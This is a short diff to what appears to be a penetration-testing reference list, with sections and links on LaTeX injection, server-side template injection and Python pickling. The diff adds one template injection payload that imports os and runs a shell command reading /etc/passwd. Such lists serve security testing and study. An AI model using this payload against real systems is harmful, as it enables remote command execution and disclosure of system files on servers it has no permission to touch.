@@ -285,6 +285,9 @@ https://0day.work/hacking-with-latex/
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection  
 
 ### Server Sided Template Injection
+```
+{% import os %}{{ os.popen("cat /etc/passwd").read() }}
+```
 https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf
 
 ### Python Pickling
